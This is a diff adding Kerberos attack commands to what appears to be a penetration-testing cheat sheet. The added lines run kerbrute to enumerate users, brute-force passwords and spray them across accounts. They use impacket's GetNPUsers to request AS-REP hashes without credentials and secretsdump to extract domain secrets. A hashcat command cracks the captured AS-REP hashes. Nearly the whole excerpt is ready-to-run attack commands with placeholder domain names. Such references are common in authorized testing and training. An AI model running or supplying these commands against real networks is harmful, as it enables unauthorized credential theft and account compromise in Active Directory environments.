@@ -175,6 +175,40 @@ https://www.youtube.com/watch?v=ctLVMi1_zBc&feature=emb_title
 
 ### [Kerberos Enumeration p88]
 ```
+Enumerating user:
+
+./kerbrute userenum --dc domain.local -d domain.local userlist.txt
+
+Bruteforcing user:
+
+./kerbrute bruteuser --dc domain.local -d domain.local passwordlist.txt backup
+
+Password Spray:
+
+./kerbrute_linux_amd64 passwordspray -d domain.local domain_users.txt password
+
+No Auth Hash:
+
+python3 GetNPUsers.py domain.local/ -no-pass -usersfile kerb_users.txt
+
+Secrets Dump:
+
+python3 secretsdump.py domain.local/username:password@domain.local
+```
+
+https://hashcat.net/wiki/doku.php?id=example_hashes  
+https://gist.github.com/TarlogicSecurity/2f221924fef8c14a1d8e29f3cb5c5c4a  
+
+
+```
+Example Hash cracking
+
+Kerberos 5, etype 23, AS-REP -> 18200
+
+hashcat -m 18200 -a 0 <AS_REP_responses_file> <passwords_file>
+```
+
+```
 Pre-Auth
 
 GetNPUsers.py WORKSTATION/ -dc-ip IP -usersfile /path/to/userslist
